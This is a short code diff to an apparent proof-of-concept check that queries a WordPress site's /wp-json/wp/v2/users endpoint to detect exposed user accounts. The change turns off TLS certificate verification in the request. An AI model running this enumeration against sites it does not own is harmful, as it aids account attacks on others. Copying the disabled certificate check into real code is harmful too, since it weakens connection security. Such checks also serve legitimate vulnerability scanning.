@@ -17,7 +17,7 @@ def poc(url):
     payload = '/wp-json/wp/v2/users'
     url = url.rstrip('/') + payload
     try:
-        r = requests.get(url)
+        r = requests.get(url, verify=False)
         if r.status_code == 200 and '[{"id":1,"name":"' in r.content:
             return url
     except Exception:
